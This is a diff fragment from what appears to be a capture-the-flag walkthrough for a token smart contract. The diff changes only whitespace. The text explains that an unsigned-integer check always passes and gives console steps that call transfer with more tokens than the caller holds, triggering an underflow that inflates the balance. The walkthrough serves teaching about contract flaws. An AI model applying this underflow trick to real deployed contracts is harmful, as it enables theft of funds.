@@ -388,13 +388,15 @@ await contract.balanceOf()
 ```
 require(balances[msg.sender] - _value >= 0)
 ``` 
-This is always going to be true because we are mapping to unsigned integers. 
+This is always going to be true because we are mapping to unsigned integers.
+
 2. Use the transfer function to send more tokens than you currently have. This will trigger an arithmetic underflow. 
 ```
 address random_address = "xx"
 await contract.balanceOf(player)
 contract.transfer(random_address, 21) 
 ``` 
+
 3. Have a look at how many tokens you have. 
 ```
 await contract.balanceOf(player)
